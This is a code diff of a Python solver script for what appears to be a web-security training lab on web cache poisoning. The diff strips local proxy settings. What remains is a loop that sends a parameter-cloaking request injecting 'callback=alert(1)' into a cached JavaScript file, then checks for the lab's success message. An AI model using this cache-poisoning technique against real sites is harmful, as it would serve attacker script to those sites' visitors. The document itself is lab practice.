@@ -9,15 +9,15 @@ class LabSolver:
         self.session = requests.Session()
 
     def poison_home_page(self):
-        response = self.session.get(self.lab_url + 'js/geolocate.js?callback=setCountryCookie&utm_content=hello;callback=alert(1)//', proxies={'http': '127.0.0.1:8080', 'https': '127.0.0.1:8080'}, verify=False)
+        response = self.session.get(self.lab_url + 'js/geolocate.js?callback=setCountryCookie&utm_content=hello;callback=alert(1)//')
         while True:
             if 'alert(1)' not in response.text:
-                response = self.session.get(self.lab_url + 'js/geolocate.js?callback=setCountryCookie&utm_content=hello;callback=alert(1)//', proxies={'http': '127.0.0.1:8080', 'https': '127.0.0.1:8080'}, verify=False)
+                response = self.session.get(self.lab_url + 'js/geolocate.js?callback=setCountryCookie&utm_content=hello;callback=alert(1)//')
             else:
                 break
 
     def check_solution(self):
-        response = self.session.get(self.lab_url, proxies={'http': '127.0.0.1:8080', 'https': '127.0.0.1:8080'}, verify=False)
+        response = self.session.get(self.lab_url)
         if 'Congratulations, you solved the lab!' in response.text:
             print('You solved the lab.')
             print('Coded by Mohamed Ahmed (ma4747gh).')
